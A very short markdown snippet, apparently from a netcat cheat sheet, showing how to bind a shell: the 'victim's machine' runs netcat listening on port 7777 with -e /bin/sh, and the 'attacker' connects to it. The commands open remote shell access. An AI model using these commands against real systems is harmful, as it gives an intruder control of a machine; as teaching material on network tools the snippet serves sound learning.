#### Adding -e /bin/sh argument to invoke the sh when the client connects
##### Victim's Machine
```
nc -l -p 7777 -e /bin/sh
```

##### Attacker
```
nc ip 7777
```